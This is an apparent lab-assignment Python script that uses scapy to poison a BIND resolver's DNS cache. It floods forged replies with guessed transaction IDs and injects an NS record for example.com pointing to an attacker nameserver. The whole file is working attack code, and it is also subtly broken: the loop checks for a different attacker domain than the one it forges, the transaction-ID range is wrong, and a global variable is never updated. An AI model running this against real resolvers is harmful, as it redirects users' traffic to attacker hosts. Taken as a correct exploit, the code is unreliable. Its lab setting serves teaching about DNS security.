#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call

import threading

parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port


'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

fakename = getRandomSubDomain() + getRandomSubDomain()

result_NS = ""
'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

def sendDNSReply():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    newNS=DNSRR(rrname="example.com", ttl=3600, type='NS', rdata="ns.dbslabattacker.net")
    tryPacket = DNS(rd=1, id=getRandomTXID(), qd=DNSQR(qname=fakename+'.example.com'), ns=newNS)
    #print "\n***** Attacker Packet Sent from Remote Server *****"
    #tryPacket.show2()
    #print "\n***** Attacker Packet Sent to Remote Server *****"
    sendPacket(sock, tryPacket, my_ip, my_query_port)

class Blinky(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon = True
        self._finished = False

    def __enter__(self):
        self.start()

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()

    def run(self):
        while not self._finished:
	    sendDNSReply()

    def stop(self):
        self._finished = True

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=fakename+'.example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    # tryPacket = DNS(rd=1, id=getRandomTXID(), qd=DNSQR(qname=fakename+'example.com'), ns=DNSRR(rrname="example.com", rdata="ns.dbslabattacker.net"))
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print 'result NS is ' + response[DNS].ns[DNSRR].rdata
    print "***** End of Remote Server Packet *****\n"
    result_NS = response[DNS].ns[DNSRR].rdata

if __name__ == '__main__':
	while result_NS != "ns.dnslabattacker.net":
		fakename = getRandomSubDomain() + getRandomSubDomain()
		with Blinky():
			exampleSendDNSQuery()
